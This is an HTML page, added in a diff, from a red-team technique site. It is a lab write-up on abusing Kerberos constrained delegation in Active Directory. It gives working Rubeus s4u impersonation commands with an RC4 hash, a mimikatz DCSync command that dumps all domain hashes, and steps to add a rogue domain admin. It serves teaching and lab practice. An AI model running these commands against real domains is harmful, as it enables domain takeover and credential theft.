@@ -1,0 +1,1066 @@
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.2.5">
+    
+    
+      
+        <title>Constrained Delegation Abuse - Red Team Techniques</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.2d9f7617.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.e6a45f82.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#00bdd6">
+        
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+  
+
+
+  
+  
+
+
+  <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-Y39JH8Q7SV"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&gtag("event","search",{search_term:this.value})}),"undefined"!=typeof location$&&location$.subscribe(function(e){gtag("config","G-Y39JH8Q7SV",{page_path:e.pathname})})})</script>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y39JH8Q7SV"></script>
+
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="cyan" data-md-color-accent="">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#constrained-delegation-abuse" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Red Team Techniques" class="md-header__button md-logo" aria-label="Red Team Techniques" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Red Team Techniques
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Constrained Delegation Abuse
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../../.." class="md-tabs__link">
+      Home
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../Forensics/" class="md-tabs__link">
+        Forensics
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../" class="md-tabs__link md-tabs__link--active">
+        Windows & AD Hacking
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Red Team Techniques" class="md-nav__button md-logo" aria-label="Red Team Techniques" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    Red Team Techniques
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../../../Forensics/">Forensics</a>
+          
+            <label for="__nav_2">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Forensics" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Forensics
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Forensics/Analyzing%20Memory%20Dumps%20using%20Volatility/" class="md-nav__link">
+        Analyzing Memory Dumps using Volatility
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Forensics/Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/" class="md-nav__link">
+        Extracting Hashes and Passwords from VMWare Memory Snapshots
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Forensics/How%20to%20capture%20physical%20memory%20to%20disk/" class="md-nav__link">
+        How to capture physical memory to disk
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../../">Windows & AD Hacking</a>
+          
+            <label for="__nav_3">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Windows & AD Hacking" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Windows & AD Hacking
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2" type="checkbox" id="__nav_3_2" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_3_2">
+          Lab Attacks
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Lab Attacks" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_2">
+          <span class="md-nav__icon md-icon"></span>
+          Lab Attacks
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Abusing%20Parent%20Child%20Domain%20Trusts%20for%20Privilege%20Escalation%20from%20DA%20to%20EA/" class="md-nav__link">
+        Abusing Parent Child Domain Trusts for Privilege Escalation from DA to EA
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Constrained Delegation Abuse
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Constrained Delegation Abuse
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#explaining-the-attack" class="md-nav__link">
+    Explaining the Attack
+  </a>
+  
+    <nav class="md-nav" aria-label="Explaining the Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#s4u-service-for-user" class="md-nav__link">
+    ⇒ S4U ( Service-For-User ) :
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#performing-the-attack" class="md-nav__link">
+    Performing The Attack
+  </a>
+  
+    <nav class="md-nav" aria-label="Performing The Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cifsvdc01endarklocal" class="md-nav__link">
+    ⇒ cifs/vdc01.endark.local :
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ldapvdc01endarklocal" class="md-nav__link">
+    ⇒ ldap/vdc01.endark.local :
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DCShadow%20Attack/" class="md-nav__link">
+        DCShadow Attack
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JustEnoughAdministration/" class="md-nav__link">
+        Just Enough Administration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../LLMNR%20Poisoning/" class="md-nav__link">
+        LLMNR Poisoning
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Messing%20with%20Kerberos%20using%20Rubeus/" class="md-nav__link">
+        Messing with Kerberos using Rubeus
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Powershell%20AMSI%20Bypass/" class="md-nav__link">
+        Powershell AMSI Bypass
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Resource%20Based%20Constrained%20Delegation/" class="md-nav__link">
+        Resource Based Constrained Delegation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Using%20DCSync%20attack%20to%20steal%20user%20hashes%20in%20a%20domain/" class="md-nav__link">
+        Using DCSync attack to steal user hashes in a domain
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_3" type="checkbox" id="__nav_3_3" >
+      
+      
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_3_3">
+          Lab Creation
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Lab Creation" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_3">
+          <span class="md-nav__icon md-icon"></span>
+          Lab Creation
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Lab%20Creation/Art%20of%20Creating%20Machines/" class="md-nav__link">
+        Art of Creating Machines
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Lab%20Creation/Child%20Domain%20Lab%20Setup/" class="md-nav__link">
+        Child Domain Lab Setup
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Lab%20Creation/Creating%20an%20Active%20Directory%20Domain/" class="md-nav__link">
+        Creating an Active Directory domain
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Lab%20Creation/DCSync%20Lab%20Setup/" class="md-nav__link">
+        DCSync Lab Setup
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Lab%20Creation/Kerberos%20Constrained%20Delegation%20Lab%20Creation/" class="md-nav__link">
+        Kerberos Constrained Delegation Lab Creation
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#explaining-the-attack" class="md-nav__link">
+    Explaining the Attack
+  </a>
+  
+    <nav class="md-nav" aria-label="Explaining the Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#s4u-service-for-user" class="md-nav__link">
+    ⇒ S4U ( Service-For-User ) :
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#performing-the-attack" class="md-nav__link">
+    Performing The Attack
+  </a>
+  
+    <nav class="md-nav" aria-label="Performing The Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cifsvdc01endarklocal" class="md-nav__link">
+    ⇒ cifs/vdc01.endark.local :
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ldapvdc01endarklocal" class="md-nav__link">
+    ⇒ ldap/vdc01.endark.local :
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+  
+                
+
+
+<h1 id="constrained-delegation-abuse">Constrained Delegation Abuse</h1>
+<p>⇒ So if you have compromised a <strong><code>user account</code></strong> / <strong><code>system</code></strong> on a <strong><code>machine</code></strong> that is allowed to <strong><code>delegate</code></strong> to Domain Controller's <strong><code>cifs</code></strong> / <strong><code>ldap</code></strong> service we can abuse that to own the domain controller!</p>
+<ul>
+<li>Refer to the lab creation guide: <a href="../../Lab%20Creation/Kerberos%20Constrained%20Delegation%20Lab%20Creation/">Kerberos Constrained Delegation Lab Creation</a></li>
+</ul>
+<hr />
+<h2 id="explaining-the-attack">Explaining the Attack</h2>
+<p>⇒ <strong>msDS-AllowedToDelegateTo</strong> :</p>
+<ul>
+<li>For a given computer or user account, this attribute specifies the list of service principal names (SPN) corresponding to Windows services that can act on behalf of the computer or user account.</li>
+</ul>
+<p>⇒ So here user enox is <strong><code>allowedtodelegate</code></strong> to <strong><code>impersonate</code></strong> as any user to the <strong><code>SPNs</code></strong> set as show in the screenshot [ i.e <strong><code>ldap</code></strong> and <strong><code>cifs</code></strong> ]</p>
+<pre><code class="language-python">get-netuser | ?{$_.cn -like &quot;naqi&quot;} | select msds-allowedtodelegateto  -ExpandProperty msds-allowedtodelegateto
+</code></pre>
+<p><img alt="Constrained%20Delegation%20Abuse/Untitled.png" src="Untitled.png" /></p>
+<ul>
+<li>So basically we can authenticate to <strong>ldap</strong> and <strong>cifs</strong> services <strong><em>*on </em>*VDC01</strong> machine as any user we want.</li>
+</ul>
+<h3 id="s4u-service-for-user">⇒ <strong>S4U</strong> ( Service-For-User ) :</h3>
+<ul>
+<li>So <strong><code>S4U</code></strong> is a set of kerberos extensions, which were implemented by Microsoft to avoid unconstrained delegations to run wild.</li>
+<li>So the <strong><code>s4u2fself</code></strong> extension allows a service to request forwardable service tickets to itself on behalf of a particular user. This was implemented so that a user authenticate to a service somewhat not using Kerberos.</li>
+<li>The extensions <strong><code>s4u2proxy</code></strong> allows the service account to use the forwardable ticket to request a service ticket to the SPN specified in msds-allowedtodelegateto.</li>
+</ul>
+<p>[ NOTE: This is only possible if the user has TRUSTED_TO_AUTH_FOR_DELEGATION flag set]</p>
+<hr />
+<h2 id="performing-the-attack">Performing The Attack</h2>
+<p>⇒ So to perform this attack we will be using Rubeus.exe tool which is a C# toolset for raw Kerberos interaction and abuses. </p>
+<ul>
+<li>It has s4u abuse extension which we can use to perform this attack</li>
+</ul>
+<p>Tool : <a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
+<p>⇒ So as we saw previously we are allowed to delegate to :</p>
+<ul>
+<li>ldap</li>
+<li>cifs</li>
+</ul>
+<p>⇒ We will be showing how to abuse both of the services to compromise the domain controller.</p>
+<ul>
+<li>First we will start with getting rc4 hash of the user :</li>
+</ul>
+<p><img alt="Constrained%20Delegation%20Abuse/Untitled%201.png" src="Untitled%201.png" /></p>
+<p>RC4: <code>**58A52D36C84FB7F5F1BEAB9A201DB1DD**</code></p>
+<h3 id="cifsvdc01endarklocal">⇒ cifs/vdc01.endark.local :</h3>
+<ul>
+<li>Now we will impersonate as Administrator user and request a ticket to <strong><code>cifs</code></strong> service :</li>
+</ul>
+<pre><code class="language-python">./Rubeus.exe s4u /user:Naqi /rc4:58A52D36C84FB7F5F1BEAB9A201DB1DD /impersonateuser:Administrator /domain:endark.local /msdsspn:cifs/vdc01.endark.local /ptt
+</code></pre>
+<p><img alt="Constrained%20Delegation%20Abuse/Untitled%202.png" src="Untitled%202.png" /></p>
+<p><img alt="Constrained%20Delegation%20Abuse/Untitled%203.png" src="Untitled%203.png" /></p>
+<ul>
+<li>No winrm or mimikatz using “<strong><code>cifs</code></strong>” . So we will instead create a user and add it to domain admins group :</li>
+</ul>
+<p><img alt="Constrained%20Delegation%20Abuse/Untitled%204.png" src="Untitled%204.png" /></p>
+<p><img alt="Constrained%20Delegation%20Abuse/Untitled%205.png" src="Untitled%205.png" /></p>
+<p>Next you could just use RunAs or WinRm to the Domain Controller to get shell as the user we created and added to Domain Admins and run mimikatz to dump hashes for persistence.</p>
+<h3 id="ldapvdc01endarklocal">⇒ <strong>ldap/vdc01.endark.local</strong> :</h3>
+<ul>
+<li>Impersonating as Administrator user and getting a ticket for <strong><code>ldap</code></strong> service :</li>
+</ul>
+<pre><code class="language-python">./Rubeus.exe s4u /user:Naqi /rc4:58A52D36C84FB7F5F1BEAB9A201DB1DD /impersonateuser:Administrator /domain:endark.local /msdsspn:ldap/vdc01.endark.local /outfile:dc.kirbi
+</code></pre>
+<p><img alt="Constrained%20Delegation%20Abuse/Untitled%206.png" src="Untitled%206.png" /></p>
+<ul>
+<li>Next we will just use the ticket with <strong>mimikatz</strong> to perform dcsync attack to dump all the hashes in the domain :</li>
+</ul>
+<pre><code class="language-python">.\mimikatz.exe &quot;kerberos::ptt dc_ldap_vdc01.endark.local.kirbi&quot; &quot;lsadump::dcsync /all /csv&quot; &quot;exit&quot;
+</code></pre>
+<p><img alt="Constrained%20Delegation%20Abuse/Untitled%207.png" src="Untitled%207.png" /></p>
+<hr />
+<p>References : <a href="https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/">https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/</a> and <a href="https://www.harmj0y.net/blog/redteaming/another-word-on-delegation">https://www.harmj0y.net/blog/redteaming/another-word-on-delegation</a></p>
+
+              
+
+  <!-- Giscus -->
+  <h2 id="__comments">Comments</h2>
+  <!-- Replace with generated snippet -->
+  <script src="https://giscus.app/client.js"
+  data-repo="redteamtechniques/redteamtechniques.github.io"
+  data-repo-id="R_kgDOHCc7xQ"
+  data-category="General"
+  data-category-id="DIC_kwDOHCc7xc4COM2i"
+  data-mapping="title"
+  data-reactions-enabled="1"
+  data-emit-metadata="0"
+  data-input-position="bottom"
+  data-theme="transparent_dark"
+  data-lang="en"
+  crossorigin="anonymous"
+  async>
+</script>
+  <!-- Reload on palette change -->
+  <script>
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object")
+      if (palette.color.scheme === "slate") {
+        var giscus = document.querySelector("script[src*=giscus]")
+        giscus.setAttribute("data-theme", "dark") 
+      }
+
+    /* Register event handlers after documented loaded */
+    document.addEventListener("DOMContentLoaded", function() {
+      var ref = document.querySelector("[data-md-component=palette]")
+      ref.addEventListener("change", function() {
+        var palette = __md_get("__palette")
+        if (palette && typeof palette.color === "object") {
+          var theme = palette.color.scheme === "slate" ? "dark" : "light"
+
+          /* Instruct Giscus to change theme */
+          var frame = document.querySelector(".giscus-frame")
+          frame.contentWindow.postMessage(
+            { giscus: { setConfig: { theme } } },
+            "https://giscus.app"
+          )
+        }
+      })
+    })
+  </script>
+
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        
+        <a href="../Abusing%20Parent%20Child%20Domain%20Trusts%20for%20Privilege%20Escalation%20from%20DA%20to%20EA/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Abusing Parent Child Domain Trusts for Privilege Escalation from DA to EA" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Abusing Parent Child Domain Trusts for Privilege Escalation from DA to EA
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../DCShadow%20Attack/" class="md-footer__link md-footer__link--next" aria-label="Next: DCShadow Attack" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              DCShadow Attack
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.indexes"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../../assets/javascripts/workers/search.bd0b6b67.min.js"}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.467223ff.min.js"></script>
+      
+    
+  </body>
+</html>
